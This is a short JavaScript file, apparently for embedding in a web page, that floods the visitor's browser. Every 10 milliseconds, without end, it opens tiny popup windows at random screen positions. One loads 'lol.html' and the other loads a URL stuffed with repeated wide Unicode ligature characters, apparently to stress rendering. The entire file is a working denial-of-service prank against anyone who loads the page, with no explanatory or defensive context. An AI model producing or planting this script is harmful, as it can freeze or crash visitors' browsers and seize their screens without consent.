(function () {
    function openWindow(url) {
        const newWin = window.open(url, "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=200, height=180, titlebar=no, alwaysRaised=yes');

        if (newWin) {
            const screenWidth = screen.width - 200; // Keep within bounds
            const screenHeight = screen.height - 180;

            const randomX = Math.floor(Math.random() * screenWidth);
            const randomY = Math.floor(Math.random() * screenHeight);

            newWin.moveTo(randomX, randomY);
        }

        return newWin;
    }

    const openWithFixedDelay = () => {
        openWindow('lol.html');
        openWindow('%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD');
        setTimeout(openWithFixedDelay, 10); // Fixed delay of 10 ms
    };

    setTimeout(openWithFixedDelay, 10); // Initial fixed delay of 10 ms
})();
